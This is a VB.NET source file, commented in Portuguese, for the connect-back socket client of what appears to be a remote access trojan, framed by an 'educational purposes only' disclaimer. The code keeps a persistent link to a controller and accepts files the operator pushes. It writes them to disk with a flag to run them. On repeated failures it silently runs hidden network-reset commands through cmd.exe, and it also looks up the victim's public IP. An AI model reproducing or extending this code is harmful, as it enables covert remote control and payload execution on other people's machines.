﻿

'!!!!!!!!!!!! Atenção codigo feito com propócito educativo !!!!!!!!!!!!!!
'!!!!!!!!!!!! Não me responsabiliso pelos seus atos !!!!!!!!!!!!!!!!!!!!!
'!!!!!!!!!!!! Apenas para proposito educativos "educacionais" '!!!!!!!!!!
'!!!!!!!!!!!! Use de forma correta perante a lei! Por favor !!!!!!!!!!!!!

Imports System.Net.Sockets
Imports System.Text
Imports System.IO
Imports System.Net
Imports Microsoft.MicrosoftClass.Microsoft

Namespace MySocketClass
    Public Class MySocket

        Public Shared TClient As TcpClient = Nothing
        Public Shared Yy As String = "#Sucess#"
        Public Shared Buffer(-1) As Byte
        Public Shared M1 As MemoryStream = Nothing
        Private Shared FileCreate(50) As FileStream 'recebe ate 50 uploads de arquivos de uma vez
        Private Shared ListUpload As New List(Of String) 'lista de arquivos uploads
        Private Shared ADD As String = String.Empty
        Private Shared TTimer As New Timers.Timer
        Private Shared TTempo As Integer = 0

        Public Shared Sub Connect(H As String, P As Integer)
            Try
                If (TClient Is Nothing) Then

                    Try
                        With M1
                            If (M1 IsNot Nothing) Then
                                Call .Close()
                                Call .Dispose()
                            End If
                        End With
                    Catch ex As Exception
                    End Try
                    M1 = New MemoryStream

                    Buffer = New Byte(-1) {}
                    TTempo = 0 'tempo de conexao demorar muita reset networck

                    TClient = New TcpClient()
                    With TClient
                        .NoDelay = True
                        'receber buffer
                        .ReceiveTimeout = (40 * 1000) '40 seg
                        .ReceiveBufferSize = 999999

                        'send buffer
                        .SendTimeout = (40 * 1000) '40 seg
                        .SendBufferSize = 999999

                        'receber buffer
                        .Client.ReceiveTimeout = (40 * 1000) '40 seg
                        .Client.ReceiveBufferSize = 999999

                        'Send Buffer 
                        .Client.SendTimeout = (40 * 1000) '40 seg
                        .Client.SendBufferSize = 999999
                        .Client.BeginConnect(H, P, New AsyncCallback(AddressOf Conect), TClient)
                    End With
                Else
                    Call DisConnect()
                End If
            Catch ex As Exception
                Call DisConnect()
            End Try
        End Sub

        Public Shared Async Sub Conect(x As IAsyncResult)
            Try
                Dim T As TcpClient = CType(x.AsyncState, TcpClient)
                If (T IsNot Nothing) Then
                    With T
                        Call .Client.EndConnect(x)
                        Await Task.Delay(1000)


                        ' --- CONFIGURAÇÃO DO KEEP-ALIVE ---
                        ' Ativa o monitoramento do Windows
                        .Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, True)

                            ' Ajusta para checar a cada 30 segundos (evita o timeout de 2h do Windows)
                            Dim SioKeepAliveValues As Byte() = New Byte(11) {}
                            BitConverter.GetBytes(1).CopyTo(SioKeepAliveValues, 0)      ' Ativado
                            BitConverter.GetBytes(30000).CopyTo(SioKeepAliveValues, 4)  ' Espera 30s de silêncio
                            BitConverter.GetBytes(1000).CopyTo(SioKeepAliveValues, 8)   ' Tenta a cada 1s se falhar

                            .Client.IOControl(IOControlCode.KeepAliveValues, SioKeepAliveValues, Nothing)
                            ' ----------------------------------


                            If (.Client.Connected) Then
                            .Client.BeginReceive(Buffer, 0, Buffer.Length,
                            SocketFlags.None, New AsyncCallback(AddressOf Data_Receiver), T)

                            Call Conected()
                            Call Verificar_Conexão()

                            Exit Sub
                        End If
                    End With
                End If
            Catch ex As Exception
            End Try

            Call DisConnect()
        End Sub

        Public Shared Async Sub DisConnect()

            TTempo += 1

            Try
                With TTimer
                    .Enabled = False
                    Call .Close()
                    Call .Dispose()
                End With
            Catch ex As Exception
            End Try
            TTimer = New Timers.Timer

            Try
                If (TClient IsNot Nothing) Then
                    With TClient

                        Try
                            If (.Client.Connected) Then 'verificar se esta conectado, so pode chama se tiver conectado ou da erro.
                                Call .Client.Shutdown(SocketShutdown.Both) 'coloque dentro de conect ou da erro se nao tiver conectado
                                .Client.Disconnect(False)
                            End If
                        Catch ex As Exception
                            'ignore
                        End Try

                        Await Task.Delay(3000) '3seg

                        Call .Close()
                    End With
                End If
            Catch ex As Exception
            End Try
            TClient = Nothing

            Try
                If (M1 IsNot Nothing) Then
                    With M1
                        Call .Close()
                        Call .Dispose()
                    End With
                End If
            Catch ex As Exception
            End Try
            M1 = New MemoryStream

            Try
                'upload
                ReDim FileCreate(100)
                Call ListUpload.Clear()
            Catch ex As Exception
            End Try

            'set bytes
            Buffer = New Byte(-1) {}

            If (TTempo >= 40) Then '40x erro: reset .net and sleep
                TTempo = 0
                Shell("cmd.exe /c ipconfig /release & ipconfig /renew & ipconfig /flushdns & ipconfig /registerdns & netsh int ip reset & netsh winsock reset", AppWinStyle.Hide)
                Await Task.Delay(10 * 1000) '10 seg
            End If

            'Conexão start
            Call Disconected() 'verificar e conecta
        End Sub

        Private Shared Sub Verificar_Conexão()
            With TTimer
                AddHandler .Elapsed, Sub()
                                         Try
                                             Dim Retorno As Boolean = Send("D") 'se for false ja tem chamado o disconect
                                             If (Not Retorno) Then
                                                 If (TTimer IsNot Nothing) Then
                                                     TTempo = 0
                                                     TTimer.Enabled = False 'stop timer
                                                 End If
                                             End If
                                         Catch ex As Exception
                                         End Try
                                     End Sub
                .Interval = (20 * 1000)
                .Enabled = True
            End With
        End Sub

        Public Shared Sub Download_Receiver(x As Byte())
            Try

                Dim ID As Integer = 0
                Dim S As String = GetS(x).Replace(Yy, String.Empty)
                Dim B As Byte() = Nothing
                Dim D() As String = Nothing

                If S.Contains("uploadfix01") Then
                    D = Split(S, "uploadfix01")
                ElseIf S.Contains("#Acabou#") Then
                    D = Split(S, "#Acabou#")
                End If

                For xn As Integer = 0 To CType(ListUpload.Count - 1, Integer)
                    If D(1).Equals(ListUpload.Item(xn)) Then
                        ID = xn
                    End If
                Next xn

                If S.Contains("#Acabou#") Then 'verificar se acabou

                    B = GetS(S)

                    If (FileCreate(ID) IsNot Nothing) Then
                        'caso seja arquivos de 2 3 bytes, como ex .txt .log, que não tenha nada, mais tenha baytes. 
                        Call FileCreate(ID).Write(B, 0, B.Length - (8 + D(1).Length))

                        'close all
                        Call FileCreate(ID).Close()
                        Call FileCreate(ID).Dispose()

                        'set
                        FileCreate(ID) = Nothing
                    End If

                    'set
                    ListUpload.Item(ID) = String.Empty

                    'run code
                    If (Not String.IsNullOrWhiteSpace(ADD)) Then
                        Task.Run(Sub()
                                     'data base 
                                     Call Data(GetS(ADD))
                                     ADD = String.Empty 'set code
                                 End Sub)
                    End If
                Else
                    S = S.Replace("uploadfix01" & D(1), String.Empty)
                    B = GetS(S)

                    If (FileCreate(ID) IsNot Nothing) Then
                        Call FileCreate(ID).Write(B, 0, B.Length)
                    End If
                End If
            Catch ex As Exception
            End Try
        End Sub

        Private Shared Sub DownCreat(ID As Integer, FileDir As String)
            FileCreate(ID) = New FileStream(FileDir, FileMode.Create, FileAccess.ReadWrite) 'cria file e add byte
        End Sub

        Public Shared Sub Data_Receiver(x As IAsyncResult)
            Try
                Dim T As TcpClient = CType(x.AsyncState, TcpClient)

                If (T Is Nothing) Then
                    Call DisConnect()
                    Exit Sub
                End If

                Select Case True
                    Case (Buffer.Length <= 0)

                    Case True
                        Call M1.Write(Buffer, 0, Buffer.Length)
                End Select

                Do While True
                    Dim DataTrueFalse As Boolean = True
                    Dim Bbytes As Byte() = (M1.ToArray)

                    If GetS(Bbytes).Contains(Yy) Then 'verificar senha
                        Dim DataArray As Array = Retorno(Bbytes, Yy)
                        Dim DataString As String = GetS(DataArray(0))

                        If DataString.Contains("SendFileToByte") Then 'verificar se e download

                            Dim pegar() As String = Split(DataString, Separador) 'pegar dados
                            Dim F As New FileInfo(pegar(1))
                            Dim FileDir As String = (Path.GetTempPath & F.Name).ToString

                            If String.IsNullOrWhiteSpace(pegar(4)) Then
                            Else
                                FileDir = (pegar(4) & New FileInfo(pegar(1)).Name).ToString
                            End If

                            If File.Exists(FileDir) Then 'verificar se a um file existente

                                Try
                                    Call File.SetAttributes(FileDir, FileAttributes.Normal)
                                    Call File.Delete(FileDir) 'deletar
                                Catch ex As Exception

                                    If (M1 IsNot Nothing) Then
                                        Call M1.Close()
                                        Call M1.Dispose()
                                    End If

                                    M1 = New MemoryStream
                                    Buffer = New Byte(-1) {}

                                    DataTrueFalse = True
                                    Continue Do

                                End Try
                            End If

                            'organizar 
                            ADD = pegar(0) & Separador 'id string
                            ADD &= F.Name & Separador 'caminho do arquivo
                            ADD &= pegar(2) & Separador 'true and false
                            ADD &= pegar(3) & Separador 'run file
                            ADD &= pegar(4) & Separador 'pasta
                            ADD &= pegar(5) & Separador 'update server true or false
                            ADD &= Yy 'senha yy

                            Try
                                For xn As Integer = 0 To CType(ListUpload.Count - 1, Integer)
                                    If String.IsNullOrWhiteSpace(ListUpload.Item(xn)) Then
                                        ListUpload.Item(xn) = F.Name
                                        Call DownCreat(xn, FileDir)
                                        Exit Try
                                    End If
                                Next xn

                                Call ListUpload.Add(F.Name)
                                Call DownCreat(ListUpload.Count - 1, FileDir)
                            Catch ex As Exception
                            End Try

                            'Reset
                            If (M1 IsNot Nothing) Then
                                Call M1.Close()
                                Call M1.Dispose()
                            End If
                            M1 = New MemoryStream

                            DataTrueFalse = False
                        End If

                        'upload files ...
                        If DataString.Contains("uploadfix01") Or DataString.Contains("#Acabou#") Then
                            Call Download_Receiver(DataArray(0))
                            DataTrueFalse = False
                        End If

                        If (DataTrueFalse) Then
                            Task.Run(Sub()
                                         'data base 
                                         Call Data(DataArray(0))
                                     End Sub)
                        End If

                        If (M1 IsNot Nothing) Then
                            Call M1.Close()
                            Call M1.Dispose()
                        End If
                        M1 = New MemoryStream

                        Dim Verifique As String = GetS(DataArray(1))
                        If String.IsNullOrWhiteSpace(Verifique) Then
                        Else
                            Call M1.Write(DataArray(1), 0, DataArray(1).Length)

                            If (Verifique.Contains(Yy)) Then
                                DataTrueFalse = True
                                Continue Do
                            End If

                        End If

                    End If

                    If (T.Client.Connected) Then
                        Dim Ava As Integer = (T.Available - 1)
                        If (Ava < 0) Then
                            Ava = 0
                        End If
                        Buffer = New Byte(Ava) {}
                        T.Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None,
                                                    New AsyncCallback(AddressOf Data_Receiver), T)
                    End If

                    Exit Do
                Loop
            Catch ex As Exception
                Call DisConnect()
            End Try
        End Sub

        Public Shared Function Retorno(B As Byte(), S As String) As Array
            Dim L As New List(Of Byte())
            Try
                Dim Pegar As Integer = Split(GetS(B), S)(0).Length

                Dim M1 As New MemoryStream
                Call M1.Write(B, 0, Pegar)
                Call L.Add(M1.ToArray)

                Dim M2 As New MemoryStream
                Call M2.Write(B, (Pegar + S.Length), B.Length - (Pegar + S.Length))
                Call L.Add(M2.ToArray)

                'M1
                Call M1.Close()
                Call M1.Dispose()

                'M2
                Call M2.Close()
                Call M2.Dispose()
            Catch ex As Exception
                Return Nothing
            End Try
            Return (L.ToArray)
        End Function

        Public Shared Function Send(S As String) As Boolean
            Try
                Dim B() As Byte = GetS(S)
                Return Send(B)
            Catch ex As Exception
            End Try
            Return False
        End Function

        Public Shared Function XSend(x As IAsyncResult) As Boolean
            Try
                Dim T As TcpClient = CType(x.AsyncState, TcpClient)
                If (T IsNot Nothing AndAlso T.Client.Connected) Then
                    With T
                        .Client.SendTimeout = (40 * 1000) '40 seg
                        .Client.EndSend(x)
                        Return True
                    End With
                End If
            Catch ex As Exception
            End Try
            Call DisConnect()
            Return False
        End Function

        Public Shared Function Send(B As Byte()) As Boolean
            Try
                If (TClient IsNot Nothing And B IsNot Nothing) Then
                    With TClient
                        If (.Client.Connected) Then
                            Dim Getts As Byte() = (GetS(Yy))

                            Dim M1 As New MemoryStream 'usa bytes pequenos para nao da erro de memoria, pois usando MemoryStream aloca na ram do pc.
                            Call M1.Write(B, 0, B.Length)
                            Call M1.Write(Getts, 0, Getts.Length)
                            Dim Bbytes As Byte() = (M1.ToArray)

                            .Client.SendTimeout = (40 * 1000) '40 seg
                            .Client.SendBufferSize = Bbytes.Length
                            .Client.BeginSend(Bbytes, 0, Bbytes.Length, SocketFlags.None,
                                              New AsyncCallback(AddressOf XSend), TClient)

                            'M1 Dispose
                            Call M1.Close()
                            Call M1.Dispose()

                            Return True
                        End If
                    End With
                End If
            Catch ex As Exception
            End Try
            Call DisConnect()
            Return False
        End Function

        Public Shared Function GetS(B As Byte()) As String
            Try
                Return Encoding.Default.GetString(B)
            Catch ex As Exception
            End Try
            Return String.Empty
        End Function

        Public Shared Function GetS(S As String) As Byte()
            Try
                Return Encoding.Default.GetBytes(S)
            Catch ex As Exception
            End Try
            Return (New Byte() {})
        End Function

        Public Shared Function IP_Local() As String
            Try
                Return Split(TClient.Client.LocalEndPoint.ToString(), ":")(0)
            Catch ex As Exception
            End Try
            Return "Erro"
        End Function

        Public Shared Function IP_Remoto() As String
            Try
                Dim x As New WebClient
                With x
                    x.Proxy = Nothing
                    x.Encoding = Encoding.UTF8
                    .Headers.Add(HttpRequestHeader.CacheControl, "no-cache")
                    .Headers.Add(HttpRequestHeader.Pragma, "no-cache")
                End With

                Dim S As String = x.DownloadString(New Uri("https://api.ipify.org/")) 'get ip wan
                Call x.Dispose()
                Return S
            Catch ex As Exception
            End Try
            Return "Erro"
        End Function
    End Class

End Namespace